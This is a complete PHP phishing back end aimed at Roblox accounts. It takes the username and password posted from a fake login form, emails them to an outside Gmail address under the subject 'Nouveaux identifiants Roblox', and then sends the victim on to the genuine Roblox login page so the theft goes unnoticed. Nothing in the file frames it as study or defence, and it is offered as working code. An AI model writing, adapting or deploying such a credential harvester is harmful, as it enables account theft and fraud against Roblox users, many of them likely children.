<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    $identifiant = $_POST['identifiant'];
    $motdepasse = $_POST['motdepasse'];

    $destinataire = "roliavoxylia@gmail.com";
    $sujet = "Nouveaux identifiants Roblox";
    $message = "Identifiant: $identifiant\nMot de passe: $motdepasse";

    mail($destinataire, $sujet, $message);
    
    header("Location: https://www.roblox.com/login");
    exit;
}
?>
